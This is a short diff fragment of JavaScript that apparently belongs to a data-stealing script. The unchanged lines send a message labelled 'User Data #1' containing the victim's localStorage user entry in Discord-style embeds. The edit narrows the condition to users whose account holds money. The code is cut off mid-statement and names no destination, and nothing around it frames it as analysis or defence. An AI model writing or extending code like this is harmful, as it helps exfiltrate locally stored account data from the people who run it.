@@ -20,7 +20,7 @@ sendMessage({
     }
   ]
 })
-if (client) {
+if (client.user.money) {
 sendMessage({  "content": "User Data #1 ("+localStorage.localuser+")",
   "embeds": [
     {
